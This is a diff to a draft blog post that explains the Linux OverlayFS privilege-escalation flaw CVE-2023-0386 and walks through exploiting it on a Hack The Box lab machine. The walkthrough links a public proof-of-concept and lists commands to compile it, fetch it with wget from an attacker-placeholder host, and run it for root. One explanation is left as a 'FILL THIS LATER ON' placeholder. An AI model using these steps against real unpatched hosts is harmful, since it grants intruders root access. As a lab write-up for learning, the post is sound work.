@@ -55,7 +55,8 @@ Lets say a binary called test is owned by root and the SUID bit for this file th
 ![suid_bit](/assets/img/SUID.jpg)
 
 ## The User Namespace
-A user namespace is a linux security feature that lets a process to have an isolated environment which gives the process the illusion that it has full access to the entire system(within the isolated environment) But in reality it just have a normal user permission within the host system allocated by the kernel.
+A user namespace is a linux security feature that lets a process to have an isolated environment which gives the process the illusion that it has full access to the entire system(within the isolated environment) But in reality it just have a normal user permission within the host system allocated by the kernel. Kernel will keep a UID/GID mapping which will look something like this:
+![uid_gid_map](/assets/img/mapping.png)
 
 ### Permission mapping between host and user namespace
 - The host system maintains a mapping that translates the user and group IDs (UIDs/GIDs) used inside a namespace to distinct, unprivileged IDs on the host system.
@@ -66,6 +67,7 @@ Now lets look at the CVE itself. CVE-2023-0386 is a privilege escalation vulnera
 - CVE-2023-0386 occurs because the Linux kernel did not properly validate the UID/GID mapping of a file's owner during an OverlayFS copy-up operation. An attacker can create a file inside an unprivileged user namespace where they appear to be as a root user(UID=0.GID=0) within that namespace and set the SUID bit on the file. When OverlayFS(the overlayFS driver which is part of the kernel) performs a copy-up, the kernel blindly trusts the file's ownership information from the namespace without verifying that the file owner's UID/GID has a valid mapping to the host user namespace. As a result, the kernel copies the file into the upper layer while preserving its privileged metadata(In this case the root ownership and the set SUID bit).
 
 - After the copy-up is completed, the attacker exits the user namespace and executes the copied file from the upper layer. Because the file now exists on the host filesystem as a root-owned SUID executable, executing it causes the program to run with host root privileges, resulting in a local privilege escalation.
+- Affected linux kernel versions are from ```5.11 to 6.1.8(Including)```
 
 ### How the exploit works?
 - For the exploit to work, first we need to SUID binary in the lower layer.
@@ -74,8 +76,58 @@ Now lets look at the CVE itself. CVE-2023-0386 is a privilege escalation vulnera
 - The reason for that is a normal user namespace uses the host machine's filesystem like ext4, which doesn't let unprivileged user create a file that appears to be owned by the host root.
 - To bypass that, we'll be using something like FUSE(Filesystem in Userspace)
 
+### FUSE (Filesystem in Userspace)
+- FUSE is a software interface for unix-like operating systems that allows unprivileged users to create/mount custom filesystems without making any edits to the kernel.
+- This is achieved by running the custom filesystem code in userspace instead of kernel.
+- Now coming to how FUSE actually helps with this vulnerability, Any file created inside a FUSE filesystem inherits whatever permissions the user-space handler gives it. Since the kernel isn't running the underlying filesystem code, it blindly trusts what the FUSE daemon reports—which is exactly how this boundary gets exploited.
+- Now, if we create a root owned binary with SUID bit set and tell the kernel that this binary is host root owned with SUID bit set, then kernel will simply believe it and when user triggers the copy-up of this binary, kernel will directly copy this file to the upper directory of which we have configured foe overlayFS whbich is in the host system.
+
+
 ### Exploiting CVE-2023-0386
-> Spoiler Alert!!. I'll be using the HTB machine called twomillion to demonstrate this vulnerability.
+> Spoiler Alert!!. I'll be using the HTB machine called twomillion to demonstrate this vulnerability. Assume that we have initial access to the target machine(I'm skipping the initial access part for the sake of this blog)
 {: .prompt-info }
 
-- To exploit this we first need to cre
+- Let's look at the kernel version and see if its vulnerable.
+
+    ```console
+$ uname -r
+5.15.70-051570-generic
+    ```
+    ![kernel_version](/assets/img/kernel_version.png)
+- So the specific kernel version 5.15 is indeed a vulnerable version.
+- Now to exploit this we'll be using the public exploit [CVE-2023-0386](https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c)
+- I'll just explain what this exploit does in short, it first creates a FUSE filesystem using libfuse and  ```FILL THIS LATER ON```
+- Now install libfuse library in the attacking machine if you don't have it already. If you are using kali linux, then you install it using the below command
+    ```bash
+    sudo apt install fuse
+    ```
+- Compile the exploit C file on the attacking machine
+    ```bash
+    gcc exploit.c -o exploit
+    ```
+- Now transfer this compiled file ```exploit``` to the target machine under the /tmp directory
+
+    *Attacker's machine*
+    ```bash
+    python3 -m http.server
+    ```
+
+    *Victim's machine*
+    ```bash
+    wget http://<ATTACKER-MACHINE-IP>:8000/exploit
+    ```
+
+- Now change the execute permission of the file and execute it
+    ```bash
+    chmod +x exploit
+    ```
+
+    ```bash
+    ./exploit
+    ```
+
+- If we check the current user, we can see we are root now.
+
+
+    
+
